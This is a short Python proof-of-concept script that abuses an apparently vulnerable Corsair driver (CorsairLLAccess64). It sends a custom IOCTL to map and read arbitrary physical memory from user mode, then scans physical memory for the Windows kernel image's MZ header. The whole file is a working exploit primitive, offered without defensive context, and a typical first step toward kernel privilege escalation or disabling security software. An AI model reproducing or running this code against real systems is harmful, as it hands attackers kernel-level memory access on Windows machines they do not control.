
import ctypes
import struct

IOCTL_MAP_PHYS_MEM = 0x00225374
PAGE_SIZE = 0x1000

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

def map_and_read(h, pa):
    inp = struct.pack("<QII", pa, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    if not ok or not out.value: return None
    try:
        return bytes((ctypes.c_ubyte * 16).from_address(out.value))
    except:
        return None

def main():
    h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
    if h == -1 or h == 0xFFFFFFFFFFFFFFFF:
        print(f"[-] Driver Open Error {ctypes.get_last_error()}")
        return

    print(f"[*] Testing DirBase 0x1AE000...")
    data = map_and_read(h, 0x1AE000)
    if data:
        print(f"    0x1AE000: {data.hex(' ')}")
    else:
        print(f"    0x1AE000: FAILED")

    print("[*] Scanning for ntoskrnl physical base (MZ)...")
    for pa in range(0, 0x20000000, 0x200000): # Scan up to 512MB
        data = map_and_read(h, pa)
        if data and data[:2] == b"MZ":
            print(f"[+] FOUND MZ at Physical 0x{pa:X}")
            return
    print("[-] Not found.")

if __name__ == "__main__":
    main()
